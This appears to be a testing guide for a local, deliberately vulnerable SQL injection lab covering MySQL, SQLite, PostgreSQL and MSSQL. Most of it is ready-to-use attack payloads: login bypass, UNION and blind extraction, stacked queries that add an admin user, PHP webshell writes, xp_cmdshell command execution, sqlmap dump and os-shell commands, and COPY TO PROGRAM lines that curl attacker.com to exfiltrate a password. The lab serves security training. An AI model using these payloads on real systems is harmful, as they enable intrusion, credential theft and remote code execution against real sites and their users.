# Testing Guide - Polyglot SQL Injection Lab

This guide provides systematic testing procedures for each vulnerability type across all database engines.

## Pre-Testing Checklist

- [ ] Docker services are running: `docker-compose ps`
- [ ] All databases are healthy: `docker-compose logs | grep -i error`
- [ ] Web interface is accessible: `http://localhost:8080`
- [ ] Burp Suite or similar proxy configured (optional)

## Test Matrix

| Vulnerability Type | MySQL | SQLite | PostgreSQL | MSSQL |
|-------------------|-------|--------|------------|-------|
| Auth Bypass | ✓ | ✓ | ✓ | ✓ |
| Boolean Blind | ✓ | ✓ | ✓ | ✓ |
| Time Blind | ✓ | Limited | ✓ | ✓ |
| Error-based | ✓ | ✓ | ✓ | ✓ |
| UNION-based | ✓ | ✓ | ✓ | ✓ |
| Stacked Queries | ✓ | ✓ | ✓ | ✓ |
| File Write | ✓ | ✓ | ✓ | ✗ |
| Command Execution | ✗ | ✗ | ✓ | ✓ |
| OOB Exfiltration | Limited | ✗ | ✓ | ✓ |

## Test Cases

### TC-001: Authentication Bypass (All Databases)

**Objective:** Bypass login without valid credentials

**Steps:**
1. Navigate to `/login?db=mysql`
2. Enter payload in username field
3. Enter any value in password field
4. Click Login

**Test Data:**

| DB | Username Payload | Expected Result |
|----|-----------------|-----------------|
| MySQL | `admin' OR '1'='1` | Login successful as admin |
| MySQL | `' OR 1=1 -- ` | Login successful as first user |
| SQLite | `admin' OR '1'='1` | Login successful as admin |
| PostgreSQL | `admin' OR '1'='1` | Login successful as admin |
| MSSQL | `admin' OR '1'='1` | Login successful as admin |

**Validation:**
- [ ] Success message displayed
- [ ] User data table shown
- [ ] Session created

---

### TC-002: Boolean-based Blind SQLi (All Databases)

**Objective:** Confirm boolean-based blind SQL injection vulnerability

**Steps:**
1. Navigate to `/login?db=mysql`
2. Test true condition
3. Test false condition
4. Observe different responses

**Test Data:**

| DB | Payload | Expected Result |
|----|---------|-----------------|
| MySQL | `admin' AND '1'='1` | Login successful |
| MySQL | `admin' AND '1'='2` | Login failed |
| SQLite | `admin' AND 1=1 -- ` | Login successful |
| PostgreSQL | `admin' AND true -- ` | Login successful |
| MSSQL | `admin' AND 1=1 -- ` | Login successful |

**Validation:**
- [ ] True condition returns data
- [ ] False condition returns no data
- [ ] Different response observable

---

### TC-003: Time-based Blind SQLi

**Objective:** Confirm time-based blind SQL injection

**Steps:**
1. Navigate to `/login?db=mysql`
2. Enter time-delay payload
3. Measure response time
4. Compare with normal response time

**Test Data:**

| DB | Payload | Expected Delay |
|----|---------|----------------|
| MySQL | `admin' AND SLEEP(5) -- ` | ~5 seconds |
| PostgreSQL | `admin' AND pg_sleep(5) -- ` | ~5 seconds |
| MSSQL | `admin'; WAITFOR DELAY '00:00:05' -- ` | ~5 seconds |
| SQLite | N/A (limited) | N/A |

**Validation:**
- [ ] Response delayed by specified time
- [ ] Login fails (as expected)
- [ ] No error messages

---

### TC-004: Error-based SQLi (MySQL)

**Objective:** Extract data using error messages

**Steps:**
1. Navigate to `/search?db=mysql`
2. Enter error-based payload
3. Observe error message containing data

**Test Data:**
```sql
Search: ' AND extractvalue(1,concat(0x7e,version())) -- 
Search: ' AND extractvalue(1,concat(0x7e,database())) -- 
Search: ' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 1))) -- 
```

**Validation:**
- [ ] SQL error displayed
- [ ] Error contains extracted data
- [ ] Version/database/username visible

---

### TC-005: UNION-based Data Extraction

**Objective:** Extract complete tables using UNION

**Steps:**
1. Navigate to `/search?db=mysql`
2. Determine column count
3. Find injectable positions
4. Extract data

**Test Data:**

**Column Detection:**
```sql
' ORDER BY 1 --   (works)
' ORDER BY 6 --   (works)
' ORDER BY 7 --   (fails)
```

**MySQL Extraction:**
```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- 
' UNION SELECT username,password,email,role,NULL,NULL FROM users -- 
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables -- 
```

**Validation:**
- [ ] Column count identified (6 columns)
- [ ] User data extracted
- [ ] Table names enumerated
- [ ] Data displayed in result table

---

### TC-006: Stacked Queries

**Objective:** Execute multiple SQL statements

**Steps:**
1. Navigate to `/report?db=mysql`
2. Enter stacked query payload
3. Verify second statement executed

**Test Data:**

**Create User:**
```sql
Title: Test'; INSERT INTO users (username,password,email,role) VALUES ('hacker','pwned','h@ck.com','admin') -- 
```

**Verify:**
1. Submit report
2. Go to `/login?db=mysql`
3. Login with `hacker` / `pwned`

**Validation:**
- [ ] Report submitted successfully
- [ ] New user created
- [ ] Can login with new credentials
- [ ] New user has admin role

---

### TC-007: SQL Injection to RCE - MySQL File Write

**Objective:** Write webshell via SQL injection

**Steps:**
1. Navigate to `/report?db=mysql`
2. Enter file write payload
3. Access written file
4. Execute commands

**Test Data:**
```sql
Title: '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/uploads/shell.php' -- 
```

**Command Execution:**
```
http://localhost:8080/uploads/shell.php?cmd=whoami
http://localhost:8080/uploads/shell.php?cmd=id
http://localhost:8080/uploads/shell.php?cmd=pwd
```

**Validation:**
- [ ] File written successfully
- [ ] Shell accessible via browser
- [ ] Commands execute successfully
- [ ] Output displayed

---

### TC-008: SQL Injection to RCE - PostgreSQL COPY

**Objective:** Write file using PostgreSQL COPY

**Steps:**
1. Navigate to `/report?db=pgsql`
2. Enter COPY TO payload
3. Access webshell

**Test Data:**
```sql
Title: '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/uploads/pgshell.php' -- 
```

**Validation:**
- [ ] File created
- [ ] Webshell functional
- [ ] Commands execute

---

### TC-009: SQL Injection to RCE - MSSQL xp_cmdshell

**Objective:** Execute OS commands via xp_cmdshell

**Steps:**
1. Navigate to `/report?db=mssql`
2. Check if xp_cmdshell is enabled
3. Execute commands

**Test Data:**
```sql
-- Check status
Title: '; SELECT value FROM sys.configurations WHERE name='xp_cmdshell' -- 

-- Execute command
Title: '; EXEC xp_cmdshell 'whoami' -- 
Title: '; EXEC xp_cmdshell 'hostname' -- 
```

**Validation:**
- [ ] xp_cmdshell is enabled
- [ ] Commands execute
- [ ] Output visible in results

---

### TC-010: Out-of-Band Exfiltration (PostgreSQL)

**Objective:** Exfiltrate data via DNS/HTTP

**Prerequisites:**
- External server to receive requests (e.g., Burp Collaborator, requestbin.com)

**Test Data:**
```sql
-- DNS exfiltration
Title: '; COPY (SELECT '') TO PROGRAM 'nslookup test.attacker.com' -- 

-- HTTP exfiltration  
Title: '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?test=1' -- 

-- Data exfiltration
Title: '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data='||(SELECT password FROM users LIMIT 1) -- 
```

**Validation:**
- [ ] DNS query received
- [ ] HTTP request received
- [ ] Data exfiltrated successfully

---

### TC-011: Database Enumeration via UNION

**Objective:** Complete database enumeration

**Test Sequence (MySQL):**

1. **Get database version:**
```sql
' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- 
```

2. **List all databases:**
```sql
' UNION SELECT schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata -- 
```

3. **List tables in current database:**
```sql
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- 
```

4. **List columns in users table:**
```sql
' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- 
```

5. **Extract all users:**
```sql
' UNION SELECT CONCAT(id,':',username,':',password,':',email,':',role),NULL,NULL,NULL,NULL,NULL FROM users -- 
```

**Validation:**
- [ ] Version extracted
- [ ] All databases listed
- [ ] All tables enumerated
- [ ] Column names obtained
- [ ] Complete user data extracted

---

## Automated Testing with sqlmap

### Test Login Form (MySQL)
```bash
sqlmap -u "http://localhost:8080/login?db=mysql" \
       --data="username=admin&password=test" \
       --batch \
       --level=5 \
       --risk=3
```

### Test Search (All Databases)
```bash
# MySQL
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" --batch --dbs

# SQLite  
sqlmap -u "http://localhost:8080/search?db=sqlite&q=test" --batch --dbs

# PostgreSQL
sqlmap -u "http://localhost:8080/search?db=pgsql&q=test" --batch --dbs

# MSSQL
sqlmap -u "http://localhost:8080/search?db=mssql&q=test" --batch --dbs
```

### Dump Specific Table
```bash
sqlmap -u "http://localhost:8080/search?db=mysql&q=test" \
       -D sqli_db \
       -T users \
       --dump \
       --batch
```

### OS Shell
```bash
sqlmap -u "http://localhost:8080/report?db=mysql" \
       --data="title=test&content=test" \
       --os-shell \
       --batch
```

---

## Performance Testing

### Measure Time-based Delay Accuracy

**Test Script:**
```bash
#!/bin/bash
echo "Testing time-based SQLi delays..."

# MySQL SLEEP(5)
echo -n "MySQL SLEEP(5): "
time curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' AND SLEEP(5) -- &password=test" > /dev/null

# PostgreSQL pg_sleep(5)  
echo -n "PostgreSQL pg_sleep(5): "
time curl -s "http://localhost:8080/login?db=pgsql" \
     -d "username=admin' AND pg_sleep(5) -- &password=test" > /dev/null

# MSSQL WAITFOR
echo -n "MSSQL WAITFOR DELAY: "
time curl -s "http://localhost:8080/login?db=mssql" \
     -d "username=admin'; WAITFOR DELAY '00:00:05' -- &password=test" > /dev/null
```

**Expected Results:**
- Each request should take ~5 seconds
- Variance should be < 0.5 seconds

---

## Regression Testing

Run this complete test suite before any code changes:

```bash
#!/bin/bash
# regression-test.sh

echo "=== SQL Injection Lab - Regression Tests ==="

# Test 1: Auth Bypass
echo "[1/10] Testing authentication bypass..."
curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' OR '1'='1&password=test" | grep -q "Login successful"
echo "✓ Auth bypass working"

# Test 2: UNION injection
echo "[2/10] Testing UNION-based SQLi..."
curl -s "http://localhost:8080/search?db=mysql&q=' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- " \
     | grep -q "8.0"
echo "✓ UNION injection working"

# Test 3: Time-based blind
echo "[3/10] Testing time-based blind SQLi..."
START=$(date +%s)
curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' AND SLEEP(3) -- &password=test" > /dev/null
END=$(date +%s)
DIFF=$((END-START))
if [ $DIFF -ge 3 ]; then
    echo "✓ Time-based injection working ($DIFF seconds)"
else
    echo "✗ Time-based injection FAILED"
fi

# Test 4-10: Add more tests...

echo "=== All Tests Complete ==="
```

---

## Security Testing Notes

### What to Look For

✅ **Successful Exploitation:**
- SQL errors revealed
- Data extracted
- Commands executed
- Files written

❌ **Failed Exploitation:**
- Errors hidden
- Queries escaped
- No time delay observed
- Files not created

### Common Issues

1. **Quotes Not Working:**
   - Try different quote types: `'`, `"`, `` ` ``
   - Try encoded: `%27`, `%22`

2. **Comments Not Working:**
   - Try different comments: `--`, `#`, `/* */`
   - Add space after `--`: `-- `

3. **UNION Column Mismatch:**
   - Increment NULL count until successful
   - Check error messages for column count

4. **File Write Failed:**
   - Check permissions: `docker-compose exec web ls -la /var/www/uploads`
   - Verify path is correct
   - Check MySQL secure_file_priv setting

---

## Test Results Template

```
Date: _______________
Tester: _______________

| Test Case | MySQL | SQLite | PostgreSQL | MSSQL | Notes |
|-----------|-------|--------|------------|-------|-------|
| TC-001 Auth Bypass | ☐ | ☐ | ☐ | ☐ | |
| TC-002 Boolean Blind | ☐ | ☐ | ☐ | ☐ | |
| TC-003 Time Blind | ☐ | ☐ | ☐ | ☐ | |
| TC-004 Error-based | ☐ | ☐ | ☐ | ☐ | |
| TC-005 UNION | ☐ | ☐ | ☐ | ☐ | |
| TC-006 Stacked | ☐ | ☐ | ☐ | ☐ | |
| TC-007 File Write | ☐ | ☐ | ☐ | ☐ | |
| TC-008 RCE | ☐ | ☐ | ☐ | ☐ | |
| TC-009 OOB | ☐ | ☐ | ☐ | ☐ | |

Issues Found:
_________________________________________________________________
_________________________________________________________________

Overall Status: ☐ PASS  ☐ FAIL
```

---

**Happy Testing! Remember: This is for educational purposes only!**
